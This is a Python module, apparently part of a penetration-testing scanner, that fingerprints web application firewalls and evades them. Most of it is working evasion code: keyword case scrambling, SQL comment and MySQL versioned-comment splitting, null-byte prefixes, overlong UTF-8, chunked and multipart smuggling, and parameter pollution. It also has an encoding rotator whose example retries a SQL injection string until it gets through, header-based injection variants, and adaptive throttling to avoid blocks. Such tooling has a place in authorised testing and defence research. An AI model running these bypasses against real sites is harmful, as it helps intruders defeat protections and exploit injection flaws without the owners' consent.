"""WAF detection and evasion — polymorphic payload encoding for injection testing.
For authorized security testing only.
"""
import re
import random
import urllib.parse
import base64
import time
import logging
from typing import Optional, List, Dict
import requests

logger = logging.getLogger("venomstrike.waf_evasion")


class WAFDetector:
    """Detect and identify Web Application Firewalls."""

    # Response patterns indicating a WAF block
    BLOCK_PATTERNS = [
        (r"access denied", "Generic WAF"),
        (r"403 forbidden", "Generic WAF/Server"),
        (r"request blocked", "Generic WAF"),
        (r"web application firewall", "Generic WAF"),
        (r"mod_security", "ModSecurity"),
        (r"noyb", "ModSecurity"),
        (r"cloudflare", "Cloudflare"),
        (r"cf-ray", "Cloudflare"),
        (r"attention required.*cloudflare", "Cloudflare"),
        (r"incapsula", "Imperva/Incapsula"),
        (r"x-sucuri", "Sucuri"),
        (r"blocked by.*waf", "Generic WAF"),
        (r"not acceptable.*406", "WAF 406 Block"),
    ]

    # Status codes that often indicate WAF blocking
    BLOCK_STATUS_CODES = {403, 406, 429, 503}

    # ── Titan v7.0: WAF Fingerprinting ────────────────────────────
    # Header-based fingerprints for specific WAF products
    WAF_HEADER_FINGERPRINTS = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
            "server_pattern": r"cloudflare",
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "server_pattern": r"awselb|amazons3|cloudfront",
        },
        "Akamai": {
            "headers": ["x-akamai-transformed", "akamai-grn"],
            "server_pattern": r"akamaighost|akamai",
        },
        "Imperva/Incapsula": {
            "headers": ["x-cdn", "x-iinfo"],
            "server_pattern": r"incapsula|imperva",
        },
        "Sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "server_pattern": r"sucuri",
        },
        "F5 BIG-IP ASM": {
            "headers": ["x-wa-info", "x-cnection"],
            "server_pattern": r"bigip|f5",
        },
        "Barracuda": {
            "headers": ["barra_counter_session"],
            "server_pattern": r"barracuda",
        },
        "ModSecurity": {
            "headers": [],
            "server_pattern": r"mod_security|modsecurity",
        },
        "Fortinet FortiWeb": {
            "headers": ["fortiwafsid"],
            "server_pattern": r"fortiweb",
        },
        "Citrix NetScaler": {
            "headers": ["ns_af", "citrix_ns_id"],
            "server_pattern": r"netscaler",
        },
    }

    def is_blocked(self, response: requests.Response) -> bool:
        """Check if a response indicates a WAF block."""
        if response is None:
            return False
        if response.status_code in self.BLOCK_STATUS_CODES:
            combined = f"{response.text[:2000]} {str(response.headers)}".lower()
            for pattern, _ in self.BLOCK_PATTERNS:
                if re.search(pattern, combined, re.IGNORECASE):
                    return True
        return False

    def identify_waf(self, response: requests.Response) -> str:
        """Identify which WAF is blocking the request.

        Uses a multi-stage approach (v7.0 Titan):
        1. Header fingerprinting — check for WAF-specific headers
        2. Server header analysis — match server string patterns
        3. Body/header pattern matching — regex against response content
        4. Status code heuristic — fallback for ambiguous cases
        """
        if response is None:
            return "Unknown"

        # Stage 1: Header fingerprinting (v7.0 Titan)
        resp_headers_lower = {
            k.lower(): v for k, v in response.headers.items()
        }
        for waf_name, fp in self.WAF_HEADER_FINGERPRINTS.items():
            for hdr in fp["headers"]:
                if hdr.lower() in resp_headers_lower:
                    return waf_name
            server = resp_headers_lower.get("server", "")
            if fp["server_pattern"] and re.search(
                fp["server_pattern"], server, re.IGNORECASE
            ):
                return waf_name

        # Stage 2: Body + header pattern matching
        combined = f"{response.text[:2000]} {str(response.headers)}".lower()
        for pattern, waf_name in self.BLOCK_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                return waf_name

        if response.status_code in self.BLOCK_STATUS_CODES:
            return "Unknown WAF (status code)"
        return "None"

    def fingerprint(self, response: requests.Response) -> Dict:
        """Return detailed WAF fingerprint information (v7.0 Titan).

        Returns a dict with ``waf_name``, ``confidence``, ``detection_method``,
        ``matched_headers``, and ``matched_patterns``.
        """
        result = {
            "waf_name": "None",
            "confidence": 0,
            "detection_method": "none",
            "matched_headers": [],
            "matched_patterns": [],
        }
        if response is None:
            return result

        resp_headers_lower = {
            k.lower(): v for k, v in response.headers.items()
        }

        # Check header fingerprints
        for waf_name, fp in self.WAF_HEADER_FINGERPRINTS.items():
            matched_hdrs = [
                h for h in fp["headers"]
                if h.lower() in resp_headers_lower
            ]
            server = resp_headers_lower.get("server", "")
            server_match = bool(
                fp["server_pattern"]
                and re.search(fp["server_pattern"], server, re.IGNORECASE)
            )
            if matched_hdrs or server_match:
                result["waf_name"] = waf_name
                result["confidence"] = min(100, 50 + len(matched_hdrs) * 20 + (30 if server_match else 0))
                result["detection_method"] = "header_fingerprint"
                result["matched_headers"] = matched_hdrs
                return result

        # Check body patterns
        combined = f"{response.text[:2000]} {str(response.headers)}".lower()
        for pattern, waf_name in self.BLOCK_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                result["waf_name"] = waf_name
                result["confidence"] = 60
                result["detection_method"] = "pattern_match"
                result["matched_patterns"].append(pattern)
                return result

        if response.status_code in self.BLOCK_STATUS_CODES:
            result["waf_name"] = "Unknown WAF (status code)"
            result["confidence"] = 30
            result["detection_method"] = "status_code"

        return result


class PayloadTransformer:
    """Transform payloads to evade WAF signatures while preserving semantics."""

    # All available technique names (used for full rotation)
    ALL_TECHNIQUES = [
        "case_variation", "comment_injection",
        "url_encode", "double_url_encode",
        "whitespace_variation", "hex_encode",
        "unicode_encode", "null_byte_injection",
        "mysql_comment_bypass", "concat_obfuscation",
        "parameter_pollution",
        "chunked_transfer", "json_smuggle",
        "multipart_boundary", "tab_substitution",
        "scientific_notation", "overlong_utf8",
    ]

    def transform(self, payload: str, techniques: List[str] = None) -> List[str]:
        """Generate multiple evasion variants of a payload.

        Args:
            payload: Original payload string.
            techniques: List of technique names to apply. If None, apply all.

        Returns:
            List of transformed payloads (always includes original).
        """
        if techniques is None:
            techniques = self.ALL_TECHNIQUES

        variants = [payload]  # Always include original

        for technique in techniques:
            method = getattr(self, f"_apply_{technique}", None)
            if method:
                result = method(payload)
                if result and result != payload and result not in variants:
                    variants.append(result)

        return variants

    def _apply_case_variation(self, payload: str) -> str:
        """Randomize case of SQL/HTML keywords."""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                    "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP",
                    "WAITFOR", "DELAY", "BENCHMARK",
                    "script", "alert", "onerror", "onload", "img", "svg"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def randomize_case(m):
                return "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in m.group()
                )
            result = pattern.sub(randomize_case, result)
        return result

    def _apply_comment_injection(self, payload: str) -> str:
        """Insert SQL comments between keywords to break WAF signatures."""
        sql_kw = re.compile(
            r"\b(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|SLEEP)\b",
            re.IGNORECASE,
        )
        return sql_kw.sub(lambda m: f"/**/{m.group()}/**/", payload)

    def _apply_url_encode(self, payload: str) -> str:
        """URL-encode special characters."""
        return urllib.parse.quote(payload, safe="")

    def _apply_double_url_encode(self, payload: str) -> str:
        """Double URL-encode the payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def _apply_whitespace_variation(self, payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ["%09", "%0a", "%0d", "+", "%20"]
        ws = random.choice(alternatives)
        return payload.replace(" ", ws)

    # Characters that receive hex encoding in SQL contexts
    HEX_ENCODE_CHARS = frozenset("'\" =();-")

    def _apply_hex_encode(self, payload: str) -> str:
        """Hex-encode special characters (e.g., ' → 0x27) for SQL contexts."""
        result = []
        for ch in payload:
            if ch in self.HEX_ENCODE_CHARS:
                result.append(f"0x{ord(ch):02x}")
            else:
                result.append(ch)
        return "".join(result)

    def _apply_unicode_encode(self, payload: str) -> str:
        """Unicode-escape non-alphanumeric characters (\\uXXXX format).

        Some WAFs fail to normalise Unicode escapes before pattern matching,
        allowing payloads like ``\\u003cscript\\u003e`` to pass through.
        """
        result = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\u{ord(ch):04x}")
        return "".join(result)

    def _apply_null_byte_injection(self, payload: str) -> str:
        """Insert a null byte before the payload.

        Some WAFs and back-end parsers truncate at a null byte, letting the
        real payload reach the application while the WAF only inspects the
        prefix.
        """
        return f"%00{payload}"

    def _apply_mysql_comment_bypass(self, payload: str) -> str:
        """Use MySQL version-conditional comments (/*!50000 ... */).

        MySQL executes code inside ``/*!NNNNN ... */`` if the server version
        is >= NNNNN.  Other databases and most WAFs treat it as a comment.
        """
        sql_kw = re.compile(
            r"\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|SLEEP|BENCHMARK)\b",
            re.IGNORECASE,
        )
        return sql_kw.sub(lambda m: f"/*!50000{m.group()}*/", payload)

    def _apply_concat_obfuscation(self, payload: str) -> str:
        """Break string literals into CONCAT() calls to evade keyword matching.

        Replaces quoted strings longer than 2 characters with
        ``CONCAT('ab','cd')`` equivalents.
        """
        def _split_string(m: re.Match) -> str:
            quote = m.group(1)
            body = m.group(2)
            if len(body) <= 2:
                return m.group(0)
            mid = len(body) // 2
            return f"CONCAT({quote}{body[:mid]}{quote},{quote}{body[mid:]}{quote})"

        return re.sub(r"(['\"])([^'\"]{3,})\1", _split_string, payload)

    def _apply_parameter_pollution(self, payload: str) -> str:
        """Create a parameter-pollution variant by duplicating the value.

        Many WAFs only inspect the first or last occurrence of a repeated
        parameter.  This variant prepends a benign decoy before the real
        payload so the pair can be sent as ``param=benign&param=<payload>``.
        The separator ``|||`` is a convention that the injection helper can
        split on.
        """
        return f"harmless|||{payload}"

    def _apply_chunked_transfer(self, payload: str) -> str:
        """Split payload into chunked transfer-encoding style fragments.

        Some WAFs fail to reassemble chunked bodies before inspection,
        allowing split payloads to bypass pattern matching.
        """
        if len(payload) < 4:
            return payload
        chunk_size = max(2, len(payload) // 3)
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        return "\r\n".join(f"{len(c):x}\r\n{c}" for c in chunks) + "\r\n0\r\n\r\n"

    def _apply_json_smuggle(self, payload: str) -> str:
        """Wrap payload in a JSON structure with Unicode escapes.

        WAFs that don't deeply parse JSON bodies may miss payloads hidden
        inside JSON string values with Unicode escape sequences.
        """
        escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
        return f'{{"data":"{escaped}"}}'

    def _apply_multipart_boundary(self, payload: str) -> str:
        """Wrap payload in a multipart/form-data boundary.

        WAFs that only inspect the first boundary or don't parse multipart
        bodies may miss the payload embedded in a subsequent part.
        """
        boundary = f"----VenomStrike{random.randint(10000, 99999)}"
        return (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"benign\"\r\n\r\n"
            f"safe_value\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"input\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--"
        )

    def _apply_tab_substitution(self, payload: str) -> str:
        """Replace spaces with horizontal tabs.

        Tabs (``\\t``) are treated as whitespace by most interpreters but
        some WAF regex patterns only match literal spaces.
        """
        return payload.replace(" ", "\t")

    def _apply_scientific_notation(self, payload: str) -> str:
        """Replace integer literals with scientific notation equivalents.

        For example, ``1`` becomes ``1e0`` and ``100`` becomes ``1e2``.
        WAFs pattern-matching on specific numeric values may miss these.
        """
        def _to_scientific(m: re.Match) -> str:
            val = int(m.group())
            if val == 0:
                return "0e0"
            import math
            exp = int(math.log10(abs(val))) if val != 0 else 0
            mantissa = val / (10 ** exp) if exp > 0 else val
            return f"{mantissa}e{exp}"
        return re.sub(r"\b(\d+)\b", _to_scientific, payload)

    def _apply_overlong_utf8(self, payload: str) -> str:
        """Encode characters using overlong UTF-8 sequences.

        Some WAFs normalise standard UTF-8 but fail to handle overlong
        (non-shortest-form) encodings, allowing payloads to slip through.
        Characters ``<``, ``>``, ``'``, ``"``, ``/`` are converted to their
        two-byte overlong form.
        """
        overlong_map = {
            "<": "%c0%bc",
            ">": "%c0%be",
            "'": "%c0%a7",
            '"': "%c0%a2",
            "/": "%c0%af",
        }
        result = []
        for ch in payload:
            if ch in overlong_map:
                result.append(overlong_map[ch])
            else:
                result.append(ch)
        return "".join(result)


class AdaptiveThrottle:
    """Adaptive rate limiting to avoid WAF blocks."""

    def __init__(self, base_delay: float = 0.5):
        self.base_delay = base_delay
        self.current_delay = base_delay
        self.consecutive_blocks = 0
        self.max_delay = 30.0

    def on_success(self):
        """Response was successful — decrease delay gradually."""
        self.consecutive_blocks = 0
        self.current_delay = max(self.base_delay, self.current_delay * 0.8)

    def on_block(self):
        """Response was blocked — increase delay with backoff."""
        self.consecutive_blocks += 1
        self.current_delay = min(
            self.max_delay,
            self.current_delay * (1.5 + self.consecutive_blocks * 0.5)
        )
        logger.debug("WAF block detected, delay increased to %.1fs", self.current_delay)

    def wait(self):
        """Sleep for the current adaptive delay."""
        jitter = random.uniform(0, self.current_delay * 0.2)
        time.sleep(self.current_delay + jitter)

    def get_delay(self) -> float:
        """Return current delay value."""
        return self.current_delay


class EncodingRotator:
    """Cycle through encoding schemes to find one that passes the WAF.

    Usage::

        rotator = EncodingRotator()
        for encoded in rotator.rotate("' OR 1=1 --"):
            resp = session.get(url, params={"q": encoded})
            if not waf.is_blocked(resp):
                break  # this encoding bypassed the WAF
    """

    # Ordered from least to most aggressive encoding
    ENCODINGS = [
        "identity",
        "url",
        "double_url",
        "hex",
        "unicode",
        "base64",
        "html_entities",
    ]

    def rotate(self, payload: str) -> List[str]:
        """Return the payload in every supported encoding."""
        variants: List[str] = []
        for enc in self.ENCODINGS:
            method = getattr(self, f"_encode_{enc}", None)
            if method:
                encoded = method(payload)
                if encoded not in variants:
                    variants.append(encoded)
        return variants

    @staticmethod
    def _encode_identity(payload: str) -> str:
        return payload

    @staticmethod
    def _encode_url(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def _encode_double_url(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def _encode_hex(payload: str) -> str:
        """Hex-encode every byte (e.g., ``%27`` for ``'``)."""
        return "".join(f"%{ord(c):02X}" for c in payload)

    @staticmethod
    def _encode_unicode(payload: str) -> str:
        """Unicode-escape every non-alphanumeric character."""
        return "".join(
            ch if ch.isalnum() else f"\\u{ord(ch):04x}"
            for ch in payload
        )

    @staticmethod
    def _encode_base64(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def _encode_html_entities(payload: str) -> str:
        """HTML numeric entity encoding (e.g., ``&#39;`` for ``'``)."""
        return "".join(
            f"&#{ord(ch)};" if not ch.isalnum() else ch
            for ch in payload
        )


class HeaderBypass:
    """Inject payloads into less-inspected HTTP headers.

    WAFs often focus on query-string and body inspection. Injecting payloads
    into headers like ``X-Forwarded-For``, ``Referer``, or ``X-Custom-IP``
    can bypass rules that don't inspect these locations.

    For authorised security testing only.
    """

    # Headers commonly processed by back-end applications but
    # frequently ignored by WAFs / IDS
    INJECTION_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Client-IP",
        "Referer",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Custom-IP-Authorization",
        "True-Client-IP",
        "CF-Connecting-IP",
    ]

    def build_header_variants(
        self, payload: str, *, extra_headers: Dict[str, str] = None,
    ) -> List[Dict[str, str]]:
        """Return a list of header dicts, each placing *payload* in a
        different header field.

        Args:
            payload: The injection payload.
            extra_headers: Optional additional headers to merge into every
                variant (e.g., cookies, auth tokens).

        Returns:
            A list of header dictionaries ready for ``requests.get(headers=...)``.
        """
        base = dict(extra_headers) if extra_headers else {}
        variants: List[Dict[str, str]] = []
        for hdr in self.INJECTION_HEADERS:
            headers = dict(base)
            headers[hdr] = payload
            variants.append(headers)
        return variants
